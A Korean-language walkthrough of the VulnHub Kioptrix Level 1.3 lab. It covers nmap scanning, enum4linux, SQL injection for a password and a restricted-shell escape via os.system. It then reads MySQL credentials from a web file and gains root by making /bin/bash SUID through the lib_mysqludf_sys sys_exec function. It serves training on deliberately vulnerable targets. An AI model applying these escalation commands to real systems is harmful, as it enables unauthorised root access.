[Kioptrix : Level 1.3](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![1](https://user-images.githubusercontent.com/69203345/109135705-b3ca9880-779a-11eb-8279-ea07aff9febe.PNG)

# enumerate + exploitation
***
## target: 192.168.25.17
### nmap -O -sV -sS -p- 192.168.25.17   
![2](https://user-images.githubusercontent.com/69203345/109136008-02783280-779b-11eb-8785-b8c38a8f2056.PNG)   
Samba 를 이용해보자    
### enum4linux 192.168.25.17   
![3](https://user-images.githubusercontent.com/69203345/109148456-a79a0780-77a9-11eb-8e57-2d9981fdb96e.PNG)    
john 을 이용한 sql injection으로 비밀번호 알아냄   
![4](https://user-images.githubusercontent.com/69203345/109149496-fc8a4d80-77aa-11eb-9acb-083953d7baa9.PNG)   
#### john으로 ssh로그인   
echo os.system('/bin/bash') 로 제한적인 쉘에서 벗어남   

# privilege escalation 
***   
ps aux | grep root | grep -v ] 로 루트권한으로 실행중인 서비스 검색    
![5](https://user-images.githubusercontent.com/69203345/109150793-b1713a00-77ac-11eb-82d7-9eb61b6a2cbe.PNG)   
mysql 이 실행중이다    
cat /var/www/checklogin.php 에서 mysql에 관한 정보를 얻었다   
![6](https://user-images.githubusercontent.com/69203345/109151364-6b68a600-77ad-11eb-9ce8-a3ffa37e7034.PNG)
### mysql -u root -p
root로 mysql로그인   
![7](https://user-images.githubusercontent.com/69203345/109151967-314bd400-77ae-11eb-99f5-3fcfd3596cb4.PNG)
### show databases;
![8](https://user-images.githubusercontent.com/69203345/109152242-9273a780-77ae-11eb-827f-c95e09faaa7c.PNG)   
### use members;
![9](https://user-images.githubusercontent.com/69203345/109153074-b84d7c00-77af-11eb-85a0-8cfa3d2313c8.PNG)
### select * from members;
![10](https://user-images.githubusercontent.com/69203345/109153422-3c9fff00-77b0-11eb-9021-b7bb212fbf8d.PNG)   
기껏 찾았는데 알고있는거였다..   
mysql에서 root권한을 얻기위해 아래 있는것들을 쳐주자   
mysql> use mysql;   
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';   
mysql> select sys_exec('chmod u+s /bin/bash');   

ls -a /bin/bash       
ls -l /bin/bash     
bash -p    를 실행하면 root권한을 획득한걸 볼수 있다...     
![11](https://user-images.githubusercontent.com/69203345/109154571-cf8d6900-77b1-11eb-9f1c-699b1f71169f.PNG)   


root획득   
꼭 이방법만 있는것은 아니다.
***
mysqludf를 이용해서 권한 상승   
sys_eval 임의의 명령 실행하고 출력반환    
sys_exec 임의의 명령 실행하고 종료코드 반환   
